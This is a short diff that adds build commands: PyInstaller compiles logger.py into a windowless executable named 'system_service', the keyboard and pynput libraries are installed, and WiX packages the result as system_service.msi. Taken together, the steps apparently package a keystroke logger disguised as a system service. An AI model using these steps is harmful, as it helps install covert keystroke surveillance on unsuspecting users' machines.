@@ -1,0 +1,10 @@
+pyinstaller --clean --onefile --noconsole --name system_service logger.py
+pyinstaller --onefile --noconsole --icon=NONE --name system_service logger.py
+
+pip install keyboard
+pip install pynput 
+pip install pyinstaller
+
+
+wix eula accept wix7                                    
+wix build ".\Package.wxs" -o ".\dist\system_service.msi"
